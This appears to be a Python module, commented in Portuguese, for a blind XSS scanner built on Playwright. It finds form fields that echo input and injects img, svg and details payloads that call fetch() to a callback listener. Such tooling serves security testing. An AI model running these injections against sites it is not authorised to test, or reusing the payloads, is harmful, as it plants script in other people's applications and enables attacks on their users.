"""
XSS Scanner Module

Este módulo detecta vulnerabilidades de Cross-Site Scripting (XSS),
com foco em Blind XSS.

Funcionalidades:
- Injeção de payloads em formulários
- Monitoramento de callbacks via servidor HTTP
- Suporte a múltiplos tipos de payload

Limitações:
- Requer CallbackServer rodando
- Payloads podem ser bloqueados por sanitização/WAF
- Falso positivos possíveis

Exemplo de Uso:
    # Integrado ao orquestrador ou executado manualmente
"""

from playwright.sync_api import Page, Browser, TimeoutError as PlaywrightTimeoutError
from typing import Any
from ..CallbackServer.xss_http_server import registrar_payload_injetado

class XSSScanner:
    """
    A class to perform XSS scanning on a web page.
    """
    def __init__(self, page: Page, browser: Browser, url_ouvinte: str, url_original: str, playwright_instance: Any):
        """
        Initializes the XSSScanner.

        Args:
            page: The Playwright Page object.
            browser: The Playwright Browser object.
            url_ouvinte: The URL of the listener server.
            url_original: The original URL of the page being scanned.
            playwright_instance: The Playwright instance.
        """
        self.page = page
        self.browser = browser
        self.url_ouvinte = url_ouvinte
        self.original_url = url_original
        self.url_original = url_original
        self.playwright_instance = playwright_instance
        self.injected_payloads = []
        self.campos_validos = []

    def _build_payloads(self, payload_id):
        """Cria uma lista de payloads blind xss com o link do servidor ouvinte."""
        payloads = []
        url_with_id = f"{self.url_ouvinte}?id={payload_id}"
        payloads_models = [
            f"<img src=x onerror=fetch('{url_with_id}')>",
            f"<svg onload=fetch('{url_with_id}')>",
            f"<details open ontoggle=fetch('{url_with_id}')>",
        ]
        for model in payloads_models:
            payloads.append(model)
        return payloads

    def _get_payload_types(self):
        """Retorna os tipos de payloads disponíveis"""
        return ["img", "svg", "details"]

    def _eco_verificator(self, eco_text):
        """Verifica se o texto enviado foi processado corretamente."""
        try:
            self.page.wait_for_load_state("domcontentloaded", timeout=10000)
            # Verifica no corpo, em atributos de input e em textareas
            body_text = self.page.locator("body").inner_text()
            if eco_text in body_text:
                return True
            
            input_values = self.page.locator("input[type=text], input[type=search]").all()
            for input_value in input_values:
                if eco_text in input_value.input_value():
                    return True
            
            textarea_values = self.page.locator("textarea").all()
            for textarea_value in textarea_values:
                if eco_text in textarea_value.input_value():
                    return True

            return False
        except Exception as e:
            print(f"An error occurred during verification: {e}")
            return False



    def _find_field_element(self, element):
        """Encontra um elemento de campo usando diferentes
        estratégias com Playwright"""
        input_field = None
        selectors = [
            f"#{element['id']}" if element.get('id') else None,
            f"[name='{element['name']}']" if element.get('name') else None,
            "input[type=text]",
            "input[type=search]",
            "textarea",
        ]
        for selector in selectors:
            if selector:
                try:
                    input_field = self.page.locator(selector).first
                    if input_field.is_visible():
                        element['id'] = input_field.get_attribute('id')
                        element['name'] = input_field.get_attribute('name')
                        return input_field
                except PlaywrightTimeoutError:
                    continue
        return None

    def _submit_form(self, input_field):
        """Submete o formulário usando diferentes estratégias com Playwright"""
        try:
            # Tenta encontrar o formulário associado ao campo de input
            form = input_field.locator("xpath=ancestor::form").first
            if form:
                form.evaluate('form => form.submit()')
                return
        except Exception:
            pass

        try:
            # Se não encontrar o formulário, tenta clicar em um botão de submit
            submit_button = self.page.locator("button[type='submit'], input[type='submit']").first
            submit_button.click(timeout=3000)
            return
        except PlaywrightTimeoutError:
            pass

        try:
            # Como último recurso, pressiona Enter
            input_field.press("Enter")
        except Exception:
            pass

    def _return_to_original_page(self):
        """Volta para a página original e fecha modais usando Playwright"""
        try:
            current_url = self.page.url
            if current_url != self.original_url:
                self.page.goto(self.original_url, wait_until="domcontentloaded", timeout=10000)
                self.page.wait_for_timeout(2000)
                try:
                    close_button = self.page.locator(
                        "button[class*='close'], button[aria-label*='close'], "                         "button:has-text('x')"
                    )
                    close_button.first.click(timeout=2000)
                except PlaywrightTimeoutError:
                    try:
                        dismiss_button = self.page.locator(
                            "button:has-text('Dismiss'), button:has-text('OK')"
                        )
                        dismiss_button.first.click(timeout=2000)
                    except PlaywrightTimeoutError:
                        try:
                            backdrop = self.page.locator(".cdk-overlay-backdrop")
                            backdrop.click(timeout=2000)
                        except PlaywrightTimeoutError:
                            try:
                                self.page.keyboard.press("Escape")
                            except Exception:
                                pass
        except Exception as e:
            print(f"Erro ao verificar/voltar página: {e}")

    def _eco_test(self, lista, test_text):
        """Função de teste para enviar um texto nos campos de input usando Playwright."""
        results = []
        for element in lista:
            try:
                input_field = self._find_field_element(element)
                if input_field:
                    input_field.clear()
                    input_field.fill(test_text)
                    self._submit_form(input_field)
                    self.page.wait_for_timeout(2000)
                    eco_result = self._eco_verificator(test_text)
                    results.append(
                        {
                            "element": element,
                            "status": "success",
                            "payload_sent": test_text,
                            "eco_text": eco_result,
                        }
                    )
            except Exception as e:
                results.append({"element": element, "status": "failed", "error": str(e)})
            self._return_to_original_page()
        return results

    def _blind_xss_injection(self):
        """Injeta payloads blind XSS - estratégia 'disparar e esquecer' usando Playwright"""
        injected_payloads = []
        try:
            for campo in self.campos_validos:
                element = campo["element"]
                field_name = element.get("name") or element.get("id")
                field_id = element.get("id")
                payload_types = self._get_payload_types()
                for payload_type in payload_types:
                    try:
                        self.page.reload()
                        input_field = self._find_field_element(element)
                        if not input_field:
                            print(f"Não foi possível encontrar o campo {field_name}")
                            continue

                        payload_id = registrar_payload_injetado(
                            campo_id=field_id,
                            campo_name=field_name,
                            payload=f"payload_{payload_type}",
                            url_origem=self.url_original,
                        )
                        payload = self._build_payloads(payload_id)[payload_types.index(payload_type)]

                        input_field.clear()
                        input_field.fill(payload)
                        self._submit_form(input_field)
                        self.page.wait_for_timeout(2000)
                        injected_payloads.append(
                            {
                                "payload_id": payload_id,
                                "payload": payload,
                                "field_name": field_name,
                                "payload_type": payload_type,
                                "status": "injected",
                            }
                        )
                        print(f"Payload {payload_id} ({payload_type}) injetado no campo {field_name}")
                    except Exception as e:
                        print(f"Falha ao injetar payload no campo {field_name}: {e}")
                        continue
        except Exception as e:
            print(f"An error occurred during blind XSS injection testing: {e}")
            return []
        return injected_payloads

    def run_scan(self, campos_interativos: list):
        """Executa o scan de XSS completo"""
        print("Iniciando varredura de XSS...")
        print("Iniciando teste de eco...")
        eco_test_text = "test-eco-gemini"
        eco_results = self._eco_test(campos_interativos, eco_test_text)
        self.campos_validos = [res for res in eco_results if res.get("eco_text")]
        print(f"Campos válidos encontrados: {len(self.campos_validos)}")
        if not self.campos_validos:
            print("Nenhum campo válido para injeção de XSS encontrado.")
            return []
        print("Iniciando injeção de payloads blind XSS...")
        self.injected_payloads = self._blind_xss_injection()
        print("Varredura de XSS concluída.")
        return self.injected_payloads
